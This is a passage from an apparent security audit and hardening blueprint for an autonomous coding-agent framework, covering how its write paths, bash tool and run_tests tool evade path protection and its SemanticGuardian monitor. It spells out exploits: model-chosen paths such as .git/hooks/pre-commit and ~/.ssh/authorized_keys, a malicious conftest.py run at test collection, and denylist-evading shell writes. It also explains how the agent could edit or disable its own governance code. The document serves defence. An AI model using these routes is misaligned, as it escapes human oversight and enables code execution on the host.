Exploit: model emits a single-file candidate with `file_path = ".git/hooks/pre-commit"` (in-repo, protected) → APPLY writes it → AutoCommitter's next `git commit` executes the hook = arbitrary code. Or `file_path = "/Users/<user>/.ssh/authorized_keys"` / `"../../etc/..."` / `".env"` → writes outside the repo or to credential files. None of the four protections (guardian path-blindness, no containment, no protected-substring, VALIDATE basename-only) stops it. This is distinct from the known "in-loop write bypass" (those are the Venom tools); this is the deterministic APPLY path itself.

Fix: in `_build_change_request` and `_apply_multi_file_candidate`, resolve each `file_path` and reject `(a)` anything that fails `resolved.relative_to(project_root)` and `(b)` `_is_protected_path(rel)`; raise `BlockedPathError` → `failure_class="security"`. Add the same two checks inside `ChangeEngine.execute` immediately before `change_engine.py:692` as defense-in-depth.

---

## Finding 2 — CRITICAL: `run_tests` is unsandboxed arbitrary-code-execution → arbitrary disk write, bypassing guardian, risk-tier, mutation budget, and the read-only contract

- `tool_executor.py:2003-2031` `_run_tests` → `test_subprocess_helper.run_pytest_subprocess_sync(["python3","-m","pytest",...])`, called with `env=None`, no plugin/conftest isolation (`test_subprocess_helper.py:442+`).
- Policy Rule 3 (`tool_executor.py:3133-3164`) constrains only the **path arguments** to live under `tests/` — it does nothing about what executing those tests *does*.
- `run_tests` is NOT in `_MUTATION_TOOLS` (`scoped_tool_access.py:31-36`), so ScopedToolBackend never counts/limits it; the `reviewer` scope is `read_only=True` yet explicitly allows `run_tests` (`scoped_tool_access.py` ROLE_TOOL_SCOPES).
- Read-only lock Rule 0d (`tool_executor.py:3051-3075`) only denies tools in `_MUTATION_TOOLS` or with a `"write"` manifest capability — `run_tests` is neither, so a *read-only* op passes it.

Exploit: agent writes `tests/conftest.py` (a non-protected `tests/` file, so the gated `write_file` accepts it after AST-pass) containing `import pathlib; pathlib.Path('.git/hooks/pre-commit').write_text('#!/bin/sh\n…')`. It then calls `run_tests(paths=["tests/"])`; pytest imports the conftest/test at collection time and executes it — arbitrary writes to `.git/`, `.env`, `~/.ssh`, anywhere, with zero governance on the side effects. A read-only reviewer subagent can trigger this against any pre-existing malicious conftest, falsifying the "no mutation can happen" guarantee Rule 0d's blast/coverage bypass rests on.

Fix: classify `run_tests` as side-effecting so read-only/reviewer scopes deny it; execute pytest under OS isolation (container/firejail/seccomp with only a tmp cache writable and the repo bind-mounted read-only except the worktree). A `tests/`-path allowlist is not a sandbox.

---

## Finding 3 — HIGH: `bash` enforces NO protected-path / containment check at all (separate from the known denylist bypass)

- `tool_executor.py:2264-2302` `_bash`: only a ~20-entry destructive-pattern denylist; no `_safe_resolve`, no `_is_protected_path`, no containment.
- Policy Rule 11 (`tool_executor.py:3240-3249`) checks only `JARVIS_TOOL_BASH_ALLOWED` — unlike Rule 12 (edit/write/delete) which calls `_is_protected_path` (`tool_executor.py:3276-3287`).

Even with the denylist fully intact, `echo x > .git/hooks/pre-commit`, `python -c "open('.env','w')..."`, or any write outside the repo succeeds, and bash output never passes SemanticGuardian. Worth tracking separately from the known denylist bypass because fixing the denylist leaves this wide open.

Fix: bash can't be statically path-checked — gate it behind the same risk-tier as mutation tools, deny it whenever `ctx.is_read_only`, and run it under OS sandboxing that masks protected paths and the world outside the write-root.

---

## Finding 4 — MEDIUM: `apply_patch` is allowlisted as a mutating tool but ungoverned (latent)

- Listed as a known mutating tool: `semantic_firewall.py:99`, `scoped_tool_access.py:35`. ScopedToolBackend will authorize+count it.
- No `GoverningToolPolicy` rule exists for it → it falls through to the default `ALLOW` at `tool_executor.py:3527`.
- No handler in `_dispatch` (`tool_executor.py:1649-1666`) → today it returns "unknown tool" (harmless), BUT a real `apply_patch` already exists at `repair_engine.py:1077` / `repair_sandbox.py:234`. The moment any backend wires apply_patch into this executor it inherits ZERO of the `_safe_resolve` + `_is_protected_path` + Iron-Gate + AST + dependency-gate coverage that `edit_file`/`write_file` get, and the policy default-allow ships it ungoverned.

Fix: remove `apply_patch` from the known/mutating sets until implemented, OR add an explicit policy rule (path-contained + protected-path) and route any handler through the same five layers as `_write_file`. Confirm `repair_sandbox.apply_patch` can never be invoked with a primary-checkout write root.

---

## Finding 5 — MEDIUM: `ChangeEngine` honors caller-supplied `write_root` / absolute `target_file` with no allowlist (cross-tree write primitive)

- `change_engine.py:417-435` `_effective_write_root` trusts `request.write_root` or `JARVIS_AUTO_COMMIT_WORKSPACE` verbatim.
- `change_engine.py:437-460` `_redirect_target`: when the target is NOT under `project_root` it is "left as-is" and then written (`change_engine.py:692`). For a relative `../../x` candidate with no override, the early `return target` branch (`change_engine.py:451-452`) writes it relative to the process CWD.

Combined with Finding 1 (model controls `target_file`), an absolute or `..` candidate path escapes the governed tree entirely; and any caller able to set `write_root` writes outside it with no guardian.

Fix: validate that the resolved final target is contained within the effective write_root, and that write_root itself is on an operator allowlist; reject absolute and `..`-bearing targets.

---

### Confirmed NON-issues (checked, not vulnerable)
- `_safe_resolve` (`tool_executor.py:1711-1736`): final-component symlink check + `relative_to(repo_root.resolve())` after `.resolve()` correctly blocks parent-symlink and dangling-symlink escapes for the in-loop tools; protected-substring check runs on the real resolved path. Solid — the holes are bash (Finding 3) and the APPLY path (Finding 1), which never call it.
- `GoverningToolPolicy` Rule 12 properly applies `_is_protected_path` to edit/write/delete (`tool_executor.py:3276-3287`).

The highest-priority gaps are Findings 1 and 2: a fully model-controlled write destination on the auto-apply path, and unsandboxed code execution via `run_tests`, both of which reach disk without SemanticGuardian, risk-tier, or the protected-path chokepoint.

## Opus synthesis blueprint

I have all anchors confirmed. Producing the blueprint.

---

# ANTI-VENOM HARDENING BLUEPRINT — O+V Mutation-Path Lockdown

All paths relative to `backend/core/ouroboros/governance/`. Line numbers verified against working tree (orchestrator.py 13181 LOC, semantic_guardian.py 1461, change_engine.py 909, tool_executor.py 7068, risk_engine.py 480).

## 1. CONFIRMED vs REFUTED

| finding_id | severity | verdict (one line) |
|---|---|---|
| S1-bash-denylist | HIGH | CONFIRMED — `_bash` (tool_executor.py:2274) substring denylist misses `find -delete`/`truncate`/`dd of=`/redirect-to-path; whitespace-variant bypass; no `_is_protected_path`. |
| S2-inloop-write-bypass | HIGH | CONFIRMED — noop short-circuit (orchestrator.py:7472) ignores `venom_edit_history`; SemanticGuardian reads post-write disk as "old" (orchestrator.py:8724-8738). |
| S3-quine-governance | CRITICAL | CONFIRMED — `semantic_guardian.py` / `tool_executor.py` absent from `_PROTECTED_PATH_SUBSTRINGS` (499) AND from `_EXPLORATION_SELF_MOD_SENTINELS` (risk_engine.py:213); deterministic APPLY classifies SAFE_AUTO. |
| S4-guardian-fail-open | CRITICAL | CONFIRMED — `except Exception: logger.debug` at orchestrator.py:8792-8796 swallows guardian crash → `_guardian_findings=[]` → no tier floor → SAFE_AUTO auto-applies. |
| S5-multifile-split | REFUTED | REFUTED / already-mitigated — Pattern 11 `dynamic_import_chain` independently trips on each half (`base64.b64decode` + `exec`). No cross-file gap for the stated exploit. |
| S6-nonpython-payload | HIGH | CONFIRMED — `_safe_parse` returns None for `.sh`/`.yaml` → 10 AST patterns early-return; `_DYNAMIC_ATTR_CALLS` missing `(os,system)`/`(subprocess,run)` → `.pth`/`.py` shell-exec undetected. |
| C1-stale-apply-dead | HIGH | CONFIRMED — Slice4bRunner (slice4b_runner.py:475-494) logs stale drift but never aborts; `should_block_apply` lives only in the dead `else:` inline path. |
| C2-unshielded-cancel | HIGH | CONFIRMED — `change_engine.execute` under `maybe_mutation_section` (orchestrator.py:9803/9832) with no `asyncio.shield`; cancel between sync `write_text` and `APPLIED` ledger → on-disk mutation, ledger stuck APPLYING, op un-retryable (dedup). |
| C3-wal-lease-leak | HIGH | CONFIRMED — `_flush_coalesced` (unified_intake_router.py:1411-1424) drops `envelopes[1:]` without `update_status` → N-1 leases replay as duplicate mutations on restart. |
| Completeness-F1 | CRITICAL | CONFIRMED — deterministic GENERATE→APPLY arc: `_build_change_request` / `_apply_multi_file_candidate` / `ChangeEngine.execute` (change_engine.py:692) write model-controlled `file_path` with no containment + no `_is_protected_path`. |
| Completeness-F2 | CRITICAL | CONFIRMED — `run_tests` (tool_executor.py:2003) runs unsandboxed pytest; conftest collection = arbitrary write; not in `_MUTATION_TOOLS`; allowed for read-only `reviewer` scope. |
| Completeness-F3 | HIGH | CONFIRMED — `_bash` has no containment/protected-path at all (separate from S1 denylist); Policy Rule 11 checks only the allow-flag. |
| Completeness-F4 | MEDIUM | CONFIRMED (latent) — `apply_patch` in mutating sets but no policy rule + no handler → default-ALLOW; inherits zero coverage the moment a handler is wired. |
| Completeness-F5 | MEDIUM | CONFIRMED — `ChangeEngine` trusts caller `write_root` / absolute / `..` target with no allowlist or containment (change_engine.py:417-460). |

**Key structural fact (drives the architecture):** `RiskEngine.classify` only applies governance/self-mod BLOCK (E2/A2, risk_engine.py:282-291/324) when `profile.source ∈ {exploration, roadmap, architecture}`. The general fallthrough (Rules 1-2, lines 331-343) blocks only `touches_supervisor`/`touches_security_surface`, and `_build_profile` sets both False for `semantic_guardian`/`tool_executor`. **Therefore classification-layer protection is bypassable by source/profile; the durable guarantees must be enforced structurally inside `ChangeEngine.execute` — the single mandatory APPLY chokepoint every write path funnels through.**

---

## 2. THE THREE MANDATED ARCHITECTURAL FIXES

### (A) STRICT FAIL-CLOSED GUARDIAN — eradicate fail-open

**Locus 1 — outer catch, orchestrator.py:8792-8796.** Replace the `except Exception: logger.debug(...skipped...)` with a fail-closed escalation. Both `RiskTier` and `risk_tier` are in-scope locals.

```python
except Exception:
    logger.warning(
        "[Orchestrator] SemanticGuardian raised — FAILING CLOSED; "
        "forcing APPROVAL_REQUIRED + freezing op=%s",
        ctx.op_id, exc_info=True,
    )
    risk_tier = RiskTier.APPROVAL_REQUIRED          # never below
    _guardian_findings = [_SENTINEL_GUARDIAN_CRASH]  # non-empty → downstream tier-floor logic stays armed
```

The operator mandate is **APPROVAL_REQUIRED + freeze the execution graph** (stronger than the verdict's NOTIFY_APPLY suggestion). APPROVAL_REQUIRED is correct because a crashed guardian is indistinguishable from a disabled one — it must route to the human gate, not a 5s preview. Define `_SENTINEL_GUARDIAN_CRASH` as a module-level `Detection(pattern="guardian_crashed", severity="hard", ...)` so any downstream code that re-derives the floor from `_guardian_findings` (REVIEW subagent, telemetry) also sees a hard finding and cannot silently relax the tier.

**Locus 2 — per-pattern catch, semantic_guardian.py:127-138.** The inner per-pattern `try/except` that swallows a single rule-eval failure must NOT let one broken detector blind the batch. Convert the swallow into a recorded hard finding:

```python
except Exception:
    detections.append(Detection(
        pattern=f"{pat_name}_eval_failed", severity="hard",
        message="pattern evaluator raised — failing closed",
        file_path=file_path, lines=(), snippet="",
    ))
    continue
```

This guarantees `inspect()`/`inspect_batch` returns a non-empty hard finding whenever ANY rule fails to evaluate → `recommend_tier_floor` returns `approval_required` → the orchestrator floor at 8757-8769 escalates. Parser failure (`_safe_parse` returns None) is a separate concern handled in fix (B)/S6, not here.

**FSM safety:** APPROVAL_REQUIRED is a normal terminal-tier the GATE phase already handles (it routes to OrangePR / CLI approval); raising the tier does NOT break the phase FSM — it reuses the existing approval branch. "Freeze the execution graph" = the op parks at GATE awaiting human; no `ctx.advance(COMPLETE)` is reachable. No new phase, no new exception type at this layer.

**Invariant established:** *guardian exception ⇒ risk_tier ≥ APPROVAL_REQUIRED, always; never SAFE_AUTO, never NOTIFY_APPLY-bypass.*

---

### (B) UNIVERSAL TAINT ROUTING — one mandatory mutation chokepoint

**The chokepoint is `ChangeEngine.execute` (change_engine.py:462)** — it is already the single function every governed write funnels through (single-file 9833, multi-file per-file 12595, L2 repair 10304/10740). The strategy: **(i) make `execute` itself perform path-containment + protected-path + guardian validation immediately before the `write_text` at change_engine.py:692, so no caller can reach disk un-validated; (ii) reroute the two paths that currently bypass it (bash-writes, in-loop edit/write) to either flow through it or replicate its gate.**

**B1 — Add a `_pre_write_gate(target, content, request)` private method, called once at change_engine.py immediately before `RollbackArtifact.capture(target)` (line ~635) and reused by the multi-file loop.** It performs, in order, fail-closed:

1. **Containment:** `resolved = target.resolve()`; reject if `resolved.relative_to(effective_write_root)` raises (covers `..` and absolute escapes — Completeness-F1/F5). Reject absolute or `..`-bearing raw `request.target_file`.
2. **Protected-path:** import `_is_protected_path` from `tool_executor` (already module-importable; used by Venom tools) and reject if it returns non-None — closes `.git/hooks/`, `.env`, credentials, `.ssh` writes on the deterministic APPLY path (Completeness-F1).
3. **Immutable-governance:** see fix (C).
4. **Guardian:** call `SemanticGuardian().inspect(path, old=<git HEAD baseline>, new=content)`; if any hard finding → raise `BlockedPathError(failure_class="security")`.

On any rejection raise a new `BlockedPathError(Exception)` defined in change_engine.py; the existing `try:` at change_engine.py:477 already wraps the whole pipeline and records FAILED. Callers (`_apply_multi_file_candidate`, orchestrator single-file) already handle `ChangeResult(success=False)` / exceptions → routes to POSTMORTEM, no FSM change.

**B2 — Replace the bash substring-denylist (tool_executor.py:2274-2287) with allowlist + sandbox.** Substring denylists are unfixable (whitespace bypass S1, infinite verb surface F3). Concrete:

- Introduce `_BASH_ALLOWED_VERBS` frozenset (read-only/inspection: `ls,cat,grep,rg,find(without -delete),git status/log/diff/show,python -m pytest,wc,head,tail,sed -n,awk,echo,...`). First token (after env-assignment strip) must be in the allowlist; any redirect token (`>`/`>>`) target must pass `_is_protected_path` AND containment. Anything else → denied.
- Run the command under the same OS-isolation wrapper used for `run_tests` (see B3): `cwd=worktree`, repo bind-mounted read-only except the write-root, no network. This makes "bash can't be statically path-checked" (F3) moot — the sandbox masks protected paths and the outside world.
- Keep `_blocked_patterns` as defense-in-depth only (extend with `-delete`, `truncate -s`, `dd of=`, `shred`), never as the primary gate.

**B3 — Sandbox `run_tests` + reclassify it side-effecting (Completeness-F2).** Add `run_tests` to `_MUTATION_TOOLS` (scoped_tool_access.py:31-36) so read-only/`reviewer` scopes DENY it (closes the "read-only reviewer triggers malicious conftest" vector). Execute pytest via `test_subprocess_helper.run_pytest_subprocess_sync` inside OS isolation (container/firejail/seccomp): repo bind read-only, only a tmp cache + the worktree writable, no network. A `tests/`-path allowlist is explicitly NOT a sandbox.

**B4 — In-loop edit/write taint (S2).** Route the noop guard + guardian-baseline:
- orchestrator.py:7472 noop short-circuit → add `venom_edit_history` check (PATCH 1 from S2 verdict): noop + any in-loop write ⇒ `ctx.advance(CANCELLED, terminal_reason_code="noop_inloop_write_guard")` + FAILED ledger. In-loop writes already went through the Venom `_is_protected_path` gate, but they never saw SemanticGuardian/risk-tier; cancelling forces a clean re-run through the deterministic arc.
- orchestrator.py:8724-8738 guardian "old" baseline → when `_path ∈ venom_edit_history` paths, read `git show HEAD:<path>` as `_old` (PATCH 2 from S2) so the guardian compares original→candidate, not post-write→candidate.

**B5 — `apply_patch` (Completeness-F4):** remove `apply_patch` from `semantic_firewall.py:99` + `scoped_tool_access.py:35` known/mutating sets until a handler exists; if/when wired, route it through `ChangeEngine.execute` (inherits the B1 gate). Add an explicit deny policy rule as a tripwire meanwhile.

**Invariant established:** *no byte reaches disk on any autonomic path without passing `ChangeEngine._pre_write_gate` (containment + protected-path + immutable-governance + guardian); the only two former bypasses — bash-write and in-loop write — are respectively sandboxed-and-allowlisted and forced back through the deterministic arc.*

---

### (C) IMMUTABLE GOVERNANCE (anti-quine) — write-closed `governance/`

**Enforcement point: inside `ChangeEngine._pre_write_gate` (the mandatory APPLY chokepoint from B1), structural and grep-pinned, no env off-switch.** Mirrors the Immutable-Orange `frozenset` pattern (cross-repo mutator G3) — evaluated FIRST, hardcoded, un-disableable.

```python
# change_engine.py — module scope, NO env read, grep-pinned
_IMMUTABLE_GOVERNANCE_SENTINELS = frozenset({
    "backend/core/ouroboros/governance/semantic_guardian",
    "backend/core/ouroboros/governance/tool_executor",
    "backend/core/ouroboros/governance/risk_engine",
    "backend/core/ouroboros/governance/orchestrator",
    "backend/core/ouroboros/governance/change_engine",
    "backend/core/ouroboros/governance/risk_tier_floor",
    "backend/core/ouroboros/governance/governed_loop_service",
    "backend/core/ouroboros/governance/semantic_firewall",
    "backend/core/ouroboros/governance/scoped_tool_access",
    "backend/core/ouroboros/governance/intake/unified_intake_router",
})

def _assert_not_immutable_governance(rel_norm: str) -> None:
    if any(s in rel_norm for s in _IMMUTABLE_GOVERNANCE_SENTINELS):
        raise BlockedPathError(
            f"immutable governance path write blocked: {rel_norm}")
```

Called in `_pre_write_gate` BEFORE classification/guardian, on the normalized POSIX relpath. Because it lives in `execute` it covers the deterministic APPLY arc (S3 + Completeness-F1), the multi-file loop, AND L2 repair — every path the completeness critic found. There is **no env flag** (unlike `JARVIS_SEMANTIC_GUARD_ENABLED`); it cannot be relaxed by self-edit because `change_engine.py` is itself in the frozenset (writing to it is blocked) and the list is grep-asserted in a regression test (`test_immutable_governance_frozenset_intact`).

**Defense-in-depth (two more layers, reusing existing infra):**
- **tool_executor.py:499** — append `"ouroboros/governance/semantic_guardian"`, `"ouroboros/governance/tool_executor"` (+ the rest) to `_PROTECTED_PATH_SUBSTRINGS` so the in-loop Venom edit/write/delete handlers reject quine edits at layer 1 (closes S3's edit_file vector before any disk write).
- **risk_engine.py:213** — add `"ouroboros/governance/semantic_guardian"` (+ `tool_executor`, `semantic_firewall`, `scoped_tool_access`, `risk_tier_floor`, `unified_intake_router`) to `_EXPLORATION_SELF_MOD_SENTINELS` so the classification layer also BLOCKs these for exploration/roadmap/architecture sources. This is advisory depth — the structural `change_engine` check is the authority.

**Why not rely on `risk_engine` alone:** as established in §1, classify only fires E2/A2 for specific `source` values and `touches_security_surface` is False for these files. The structural `change_engine` frozenset is source-independent and profile-independent.

**Invariant established:** *`governance/` and the immune files are write-closed to the autonomic path — `∀ write w on any autonomic path: target(w) ∉ _IMMUTABLE_GOVERNANCE_SENTINELS`, enforced with no env off-switch, grep-pinned. Human/IDE/direct-git edits are unaffected.*

---

### Plus: C2 unshielded-cancel + remaining confirmed findings

**C2 — `asyncio.shield` the mutation critical section** (orchestrator.py). `asyncio` already imported.
- Line 9833: `change_result = await asyncio.shield(self._stack.change_engine.execute(change_request))`
- Line 9804: `change_result = await asyncio.shield(self._apply_multi_file_candidate(...))`
The shield's inner Task runs `write_text` + the `APPLIED` ledger commit (change_engine.py:739) to completion even when `_op_task` is cancelled; `CancelledError` still propagates at the shield boundary so the user's stop is honored and the op records CANCELLED — but the ledger is consistent (APPLIED before CANCELLED), closing the un-retryable-stuck-APPLYING window. Track the git-commit section at orchestrator.py:10455 as a separate lower-severity follow-up (git commits are OS-atomic + replayable).

**C1 — wire `should_block_apply` into Slice4bRunner** (slice4b_runner.py:475-494). Replace the log-only hash loop with the `should_block_apply`/`STATE_DRIFT_UNRECONCILED` block-and-POSTMORTEM body from the verdict; `JARVIS_STATE_DRIFT_VERIFY_ENABLED=false` degrades to log-only. Also fix the stale "default false" comment at orchestrator.py:9288.

**C3 — ack absorbed leases in `_flush_coalesced`** (unified_intake_router.py:1411). After `base = envelopes[0]`, loop `envelopes[1:]` calling `self._wal.update_status(_absorbed.lease_id, "acked")` (try/except warn). Stops N-1 duplicate-mutation replay on restart.

**S6 — guardian non-Python coverage** (semantic_guardian.py). Extend `_DYNAMIC_ATTR_CALLS` (line 886) with `(os,system)`, `(os,popen)`, `(subprocess,{run,call,Popen,check_output,check_call})`; add regex Pattern 16 `shell_exec_introduced` (delta-gated, hard) registered in `_ALL_PATTERNS`/`_PATTERNS` so it fires on `.sh`/`.yaml` where `_safe_parse` returns None. **Additionally**, in fix (B)'s `_pre_write_gate`, treat `_safe_parse → None` on a `.py`/`.pth` candidate as a hard finding (parser-failure ⇒ fail-closed), so opaque non-parseable Python content can never slip past as "no AST patterns ran."

---

## 3. SEQUENCING (reviewed sequential — spec → plan → per-task-review, NOT parallel)

These touch the same load-bearing files; order chosen so each step is independently testable and later steps build on earlier guarantees. **Group by file, lowest-coupling leaves first, the chokepoint last.**

**Phase 0 — leaf modules (no cross-file deps, fully unit-testable in isolation):**
1. `semantic_guardian.py` — (A) Locus-2 per-pattern fail-closed + S6 `_DYNAMIC_ATTR_CALLS`/Pattern 16. *Test: pattern-eval crash → hard finding; `.sh`/`.pth` shell-exec → hard finding.*
2. `risk_engine.py` — (C) defense-in-depth sentinels into `_EXPLORATION_SELF_MOD_SENTINELS`. *Test: exploration op targeting semantic_guardian → BLOCKED.*
3. `unified_intake_router.py` — C3 absorbed-lease ack. *Test: 3-coalesce → restart → 1 dispatch, not 3.*

**Phase 1 — Venom surface (tool_executor + scoped access):**
4. `tool_executor.py` — (C) `_PROTECTED_PATH_SUBSTRINGS` additions; (B2) bash allowlist + redirect-target containment (+ defense-in-depth denylist verbs); (B3) `run_tests` → `_MUTATION_TOOLS`; (B5) remove `apply_patch` from mutating sets. *Test: quine edit_file blocked at layer 1; `find -delete`/`rm  -rf` blocked; read-only reviewer denied run_tests.*
   - `scoped_tool_access.py` / `semantic_firewall.py` — paired edits for B3/B5.

**Phase 2 — THE CHOKEPOINT (highest risk, last so it composes on top of validated leaves):**
5. `change_engine.py` — define `BlockedPathError`, `_IMMUTABLE_GOVERNANCE_SENTINELS` (C), `_pre_write_gate` (B1: containment + protected-path + immutable + guardian + parser-fail-closed), call it before line 635. *Test: model `file_path=".git/hooks/pre-commit"` / `"../x"` / `"semantic_guardian.py"` all → BlockedPathError → FAILED.*

**Phase 3 — orchestrator (composes everything; most lines, touch last):**
6. `orchestrator.py` — (A) Locus-1 fail-closed except (8792); B4 noop guard (7472) + guardian git-HEAD baseline (8724); C2 `asyncio.shield` (9804/9833); fix stale comment 9288. *Test: guardian crash → APPROVAL_REQUIRED; noop+inloop-write → CANCELLED; cancel-during-APPLY → ledger consistent.*

**Phase 4 — phase runner:**
7. `phase_runners/slice4b_runner.py` — C1 `should_block_apply` wiring (depends on nothing above; could move earlier, but kept after orchestrator so the inline reference pattern at orchestrator.py:9647 is confirmed first).

**Sandbox infra (B2/B3 OS-isolation)** is the one genuinely new component — build it as a small shared helper (`sandbox_exec.py`) in Phase 1 and consume from both bash and run_tests. If container/firejail/seccomp is not available in an env, it must **fail closed** (deny bash/run_tests), never silently run unsandboxed.

### Single highest-risk change
**Phase 2, step 5 — `ChangeEngine._pre_write_gate` in `change_engine.py:execute`.** It is the universal chokepoint: every governed write (single-file, multi-file, L2 repair, future apply_patch) flows through it, so a bug here either (a) breaks ALL legitimate applies (false-positive containment/guardian rejection halts the whole loop) or (b) silently no-ops the gate (false sense of security). It must be landed with: the immutable-frozenset grep-regression test, a full apply-path integration test (legitimate Body edit still applies), and a fail-closed default (any internal error in `_pre_write_gate` → `BlockedPathError`, never fall through to `write_text`). Review this one in isolation, with the most scrutiny.

---

## 4. INVARIANTS ESTABLISHED (mathematical / structural)

1. **Guardian fail-closed (A):** `guardian raises ⇒ risk_tier ≥ APPROVAL_REQUIRED ∧ findings ≠ ∅`. No execution path yields SAFE_AUTO when the immune system is blind. (`∄` transition `is_noop ∨ SAFE_AUTO` reachable after a guardian exception.)
2. **Universal taint chokepoint (B):** `∀ disk-mutation w on the autonomic path: w passes ChangeEngine._pre_write_gate`. Bash and in-loop writes — the two historical bypasses — are sandboxed+allowlisted (cannot escape write-root/touch protected paths) and re-routed through the deterministic arc respectively. ⟹ *no byte reaches disk without containment + protected-path + guardian validation.*
3. **Immutable governance (C):** `∀ w: target(w) ∉ _IMMUTABLE_GOVERNANCE_SENTINELS` on every autonomic path, enforced with **no env off-switch**, grep-pinned, and self-protecting (`change_engine.py ∈ frozenset`). ⟹ *`governance/` is write-closed to O+V; the immune system cannot be edited, disabled, or quined by the loop it governs.*
4. **Cancel-atomic mutation (C2):** the file-write + `APPLIED` ledger commit is an `asyncio.shield`-protected atomic section ⟹ `(file mutated on disk) ⟺ (ledger state = APPLIED)`. No `mutated-but-ledger-APPLYING` un-retryable state exists.
5. **No-replay-duplication (C3):** `∀ coalesced batch of N: exactly 1 dispatch survives restart` (N-1 leases tombstoned `acked`). ⟹ idempotent intake across process death.
6. **Stale-write abort (C1):** `file changed in (GENERATE, APPLY] ⇒ APPLY aborts to POSTMORTEM`, not silent overwrite ⟹ *no candidate applies against a baseline it did not explore.*
7. **Parser-fail-closed (B/S6):** `_safe_parse → None on .py/.pth candidate ⇒ hard finding`; non-Python payloads (`.sh`/`.yaml`) are covered by regex Pattern 16 ⟹ *opaque/non-parseable content cannot pass as "clean."*

---

**Files touched (6 + 3 paired/new):** `semantic_guardian.py`, `risk_engine.py`, `unified_intake_router.py`, `tool_executor.py`, `change_engine.py`, `orchestrator.py`, `phase_runners/slice4b_runner.py`, paired `scoped_tool_access.py`/`semantic_firewall.py`, new `sandbox_exec.py`. **S5 requires no change** (Pattern 11 already mitigates). This blueprint is the spec for the reviewed sequential implementation; do not auto-mutate the brain stem — every Phase-2/Phase-3 task is a human-reviewed checkpoint.
